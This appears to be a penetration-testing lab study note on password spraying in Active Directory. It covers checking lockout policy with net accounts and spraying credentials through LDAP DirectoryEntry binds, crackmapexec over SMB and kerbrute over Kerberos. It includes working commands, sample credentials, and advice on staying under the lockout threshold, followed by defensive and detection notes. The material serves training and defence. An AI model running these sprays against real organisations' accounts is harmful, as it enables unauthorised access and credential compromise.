## Overview

Password attacks are often effective in Active Directory because valid domain credentials can provide:

```text
initial access
additional footholds
lateral movement options
local administrator access
access to shares and services
higher-privileged user access
```

This note focuses on **password spraying** in AD.

Password spraying means:

```text
trying one password against many users
instead of
trying many passwords against one user
```

This reduces the chance of locking out a single account.

> [!warning]
> Always check the domain account lockout policy before spraying passwords. Too many failed logons can lock accounts and alert defenders.

---

# Password Spraying Mindset

## Goal

The goal is to find valid credentials without triggering account lockouts.

Good spraying candidates include:

```text
common passwords
seasonal passwords
company-themed passwords
passwords found in shares
passwords from onboarding emails
passwords from old policy files
password patterns
default passwords
known reused passwords
```

Examples from previous enumeration:

```text
Nexus123!
Flowers1
HenchmanPutridBonbon11
P@$$w0rd
```

---

## Why Account Lockout Matters

A brute force attack tries many passwords against one account.

This can quickly trigger lockout.

A password spray tries one password against many accounts.

This is safer when done slowly and within policy limits.

Example:

```text
Bad:
user1: password1
user1: password2
user1: password3
user1: password4
user1: password5

Better:
user1: Nexus123!
user2: Nexus123!
user3: Nexus123!
user4: Nexus123!
```

# Step 1 – Check Domain Account Policy

Run from a domain-joined Windows host as a domain user:

```cmd
net accounts
```

Example:

```powershell
PS C:\Users\jeff> net accounts
```

Example output:

```text
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

---

## Key Fields

| Field | Meaning |
|---|---|
| `Minimum password length` | Minimum length required for domain passwords |
| `Maximum password age` | How often users must change passwords |
| `Password history` | How many previous passwords cannot be reused |
| `Lockout threshold` | Failed attempts before lockout |
| `Lockout duration` | How long the account remains locked |
| `Lockout observation window` | Time window for counting failed attempts |

---

## Example Interpretation

Given:

```text
Lockout threshold: 5
Lockout duration: 30 minutes
Lockout observation window: 30 minutes
```

Meaning:

```text
5 failed attempts can lock an account.
After 30 minutes, the failed attempt count resets.
```

Safer approach:

```text
attempt fewer than 5 passwords per user per observation window
```

In this case:

```text
4 attempts per user per 30 minutes avoids hitting the threshold,
assuming the real user does not also fail logins during that window.
```

> [!important]
> Leave a buffer. If the threshold is 5, do not intentionally use all 5 attempts.

# Method 1 – LDAP / ADSI Password Spraying

## Concept

PowerShell can authenticate to LDAP using a supplied username and password.

This uses:

```text
System.DirectoryServices.DirectoryEntry
```

If the password is correct:

```text
DirectoryEntry object creation succeeds.
```

If the password is incorrect:

```text
PowerShell returns an authentication error.
```

---

## Build LDAP Path

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
```

Example resulting LDAP path:

```text
LDAP://DC1.corp.com/DC=corp,DC=com
```

---

## Test One Credential with DirectoryEntry

```powershell
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

Successful authentication output:

```text
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

Interpretation:

```text
The username and password are valid.
```

---

## Failed Authentication Example

Example with wrong password:

```powershell
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "WrongPassword")
```

Example error:

```text
The user name or password is incorrect.
```

Interpretation:

```text
The credential pair is invalid.
```

# Method 2 – SMB Password Spraying

## Concept

SMB spraying attempts authentication over SMB.

Tool:

```text
crackmapexec
```

SMB spraying is traditional and useful, but can be noisy.

Why noisy?

```text
each attempt creates and tears down an SMB connection
network traffic volume can be high
authentication failures are logged
```

---

## Prepare User List

```bash
cat users.txt
```

Example:

```text
dave
jen
pete
```

---

## Spray Password with crackmapexec

```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

Options:

| Option | Meaning |
|---|---|
| `smb` | Use SMB protocol |
| `192.168.50.75` | Target domain-joined host |
| `-u users.txt` | Username list |
| `-p 'Nexus123!'` | Password to spray |
| `-d corp.com` | Domain |
| `--continue-on-success` | Continue after finding valid credentials |

---

## Example Output

```text
SMB 192.168.50.75 445 CLIENT75 [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\jen:Nexus123!
SMB 192.168.50.75 445 CLIENT75 [+] corp.com\pete:Nexus123!
```

Interpretation:

```text
dave:Nexus123! is invalid.
jen:Nexus123! is valid.
pete:Nexus123! is valid.
```

---

## Local Admin Indicator

`crackmapexec` can also show whether valid credentials have local administrator rights on the target.

Example:

```bash
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```

Example output:

```text
[+] corp.com\dave:Flowers1 (Pwn3d!)
```

Meaning:

```text
Credentials are valid.
dave has administrative privileges on the target system.
```

Why this matters:

```text
valid credentials + local admin = possible lateral movement or credential access path
```

---

## SMB Spray Notes

Advantages:

```text
easy to run from Kali
validates credentials against SMB
can reveal local admin access on the target
useful for checking access level
```

Limitations:

```text
no automatic account policy check
noisy
slower than Kerberos-based techniques
can lock accounts if used carelessly
requires SMB reachability
```

> [!warning]
> `crackmapexec` does not check the lockout policy before spraying. Know the policy before using it.

# Method 3 – Kerberos Password Spraying

## Concept

Kerberos spraying checks whether credentials are valid by attempting to obtain a TGT.

The process uses:

```text
AS-REQ
AS-REP / error response
```

This can be very fast because only a small Kerberos exchange is needed.

Tool:

```text
kerbrute
```

---

## Why Kerberos Spraying Is Useful

Advantages:

```text
fast
cross-platform
less overhead than SMB
does not require SMB connection setup
queries the KDC directly
```

Limitations:

```text
still causes failed authentication events
still affected by lockout policy
requires Kerberos/DC reachability
requires correctly formatted username list
```

---

## Prepare Username List

On Windows:

```powershell
type .\usernames.txt
```

Example contents:

```text
pete
dave
jen
```

> [!tip]
> If `kerbrute` returns network or parsing errors on Windows, check that the username file encoding is ANSI.

---

## Spray with kerbrute

Windows example:

```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

Example output:

```text
Using KDC(s):
 dc1.corp.com:88

[+] VALID LOGIN:  jen@corp.com:Nexus123!
[+] VALID LOGIN:  pete@corp.com:Nexus123!

Done! Tested 3 logins (2 successes) in 0.041 seconds
```

Findings:

```text
jen:Nexus123!
pete:Nexus123!
```

---

## Kerberos Spray Notes

Kerberos password spraying is often preferred when:

```text
you have a clean username list
Kerberos is reachable
you want fast validation
you want less SMB traffic
```

Be careful because:

```text
failed Kerberos pre-authentication events may be logged
account lockouts still apply
large sprays are still detectable
```

# Comparing Spray Methods

| Method | Example Tool | Pros | Cons |
|---|---|---|---|
| LDAP / ADSI | `Spray-Passwords.ps1` | Domain-focused, flexible, low-and-slow | PowerShell/script logging |
| SMB | `crackmapexec smb` | Shows valid creds and local admin status | Noisy, slower, lockout risk |
| Kerberos | `kerbrute` | Fast, lightweight, direct KDC check | Still logs failures, lockout risk |

# Defensive Notes

Password spraying can generate:

```text
failed logon events
Kerberos pre-authentication failures
SMB authentication failures
LDAP bind failures
account lockouts
authentication attempts across many users
```

Defensive controls:

```text
strong lockout policy
MFA where possible
password filtering
banned password lists
monitoring for low-and-slow failures
alerting on many users failing with one source
alerting on one password sprayed across many accounts
disable stale accounts
remove weak default passwords
monitor Kerberos failures
monitor SMB failures
```

Detection clues:

```text
same source attempting many usernames
same password pattern across accounts
many failures followed by a few successes
authentication attempts just below lockout threshold
CME or Kerbrute user-agent/tool patterns where visible
```

---

# Key Takeaways

- Always check account lockout policy before spraying.
- Password spraying tries one password against many users.
- Leave a safety buffer below the lockout threshold.
- `net accounts` reveals password and lockout policy.
- LDAP/ADSI spraying can be done with `DirectoryEntry`.
- `Spray-Passwords.ps1` automates LDAP-based password spraying.
- SMB spraying with `crackmapexec` is useful but noisy.
- `crackmapexec` can identify local admin access with `(Pwn3d!)`.
- Kerberos spraying with `kerbrute` is fast and lightweight.
- Valid credentials should trigger renewed enumeration from the new user context.
- Passwords found during share hunting may be useful even if stale.
- Password patterns can support custom wordlists and careful spraying.
- Spraying is detectable and must be done slowly, carefully, and only within scope.
